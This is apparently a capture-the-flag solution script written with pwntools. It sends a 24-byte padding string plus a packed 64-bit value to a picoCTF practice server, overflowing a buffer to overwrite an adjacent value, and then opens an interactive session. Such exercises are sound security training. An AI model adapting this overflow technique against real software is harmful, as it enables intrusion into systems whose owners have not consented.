from pwn import *

# r = process('./local-target')
HOST, PORT = "saturn.picoctf.net 55680".split()
r = remote(HOST, PORT)
r.recvuntil(b'string: ')
r.sendline(b'A' * 24 + p64(0x41))

r.interactive()